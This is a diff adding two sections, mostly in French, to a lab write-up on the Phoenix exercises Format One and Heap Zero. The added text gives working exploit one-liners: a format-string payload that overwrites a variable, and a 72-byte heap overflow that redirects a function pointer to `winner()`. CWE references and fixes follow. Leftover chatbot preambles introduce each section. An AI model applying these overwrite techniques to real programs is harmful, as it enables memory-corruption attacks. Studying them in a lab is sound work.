@@ -173,6 +173,91 @@ sprintf(locals.dest, "%s", buffer)
 snprintf(locals.dest, 32, "%s", buffer)
 ```
 
+Voici le **Markdown complet pour Format One**, suivant ton canevas :
+
+***
+
+### 4.2 Format One
+
+#### Identify the Weakness
+
+*   Utilisation de `gets()` pour lire l’entrée dans un buffer de 64 octets → vulnérabilité classique (dépassement possible).
+*   Ensuite, `sprintf(locals.dest, buffer)` → **format string vulnérable** : l’utilisateur contrôle le format, ce qui permet d’écrire en mémoire ou d’afficher des données sensibles.
+*   `locals.dest` fait 32 octets → risque de débordement si la chaîne formatée dépasse cette taille.
+
+#### Try to Exploit the Weakness
+
+*   Objectif : modifier `changeme` pour qu’il vaille `0x45764f6c` (ASCII : "lOvE").
+*   Exploitation simple : utiliser `%x` pour remplir et injecter la valeur.
+
+```bash
+python3 -c 'print("%32x" + "lOvE")' | ./format-one
+```
+
+*   `%32x` → remplit avec des hexadécimaux, puis `"lOvE"` déborde dans `changeme`.
+
+#### Find CWE Linked to the Weakness
+
+*   CWE-121: Stack-based Buffer Overflow
+*   CWE-134: Use of Externally-Controlled Format String  
+
+#### Remediation
+
+*   Ne jamais utiliser `sprintf` avec une chaîne contrôlée par l’utilisateur comme format.
+*   Corriger :
+
+```c
+sprintf(locals.dest, "%s", buffer);
+// ou mieux :
+snprintf(locals.dest, sizeof(locals.dest), "%s", buffer);
+```
+Voici le **Markdown pour Heap Zero**, rédigé selon le canevas que tu as donné :
+
+***
+
+### 5.1 Heap Zero
+
+#### Identify the Weakness
+
+*   Utilisation de `strcpy` sans contrôle de taille pour copier `argv[1]` dans `d->name` (64 octets).
+*   La structure `fp` contient un **pointeur de fonction** juste après dans le tas (heap).
+*   En écrivant plus de 64 octets, on peut **écraser le pointeur** et détourner le flux d’exécution.
+
+#### Try to Exploit the Weakness
+
+*   Objectif : faire pointer `f->fp` vers `winner()`.
+*   Trouver l’adresse de `winner()` :
+
+```bash
+objdump -S /opt/phoenix/i486/heap-zero | grep winner
+# Résultat : 08048835 <winner>
+```
+
+*   Calculer l’offset :  
+    Affichage du programme → `data` et `fp` :
+
+<!---->
+    data is at 0xf7e67008, fp is at 0xf7e67050
+Différence = `0x48 = 72` octets.
+
+*   Payload = 72 octets de remplissage + adresse de `winner()` :
+
+```bash
+./heap-zero "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*72 + b"\x35\x88\x04\x08")')"
+```
+
+#### Find CWE Linked to the Weakness
+
+*   CWE-122: Heap-based Buffer Overflow  
+
+#### Remediation
+
+*   Remplacer `strcpy` par une version sécurisée :
+```c
+strncpy(d->name, argv[1], sizeof(d->name)-1);
+d->name[sizeof(d->name)-1] = '\0';
+```
+
 ### 6.1 Stack Four
 
 #### Identify the Weakness
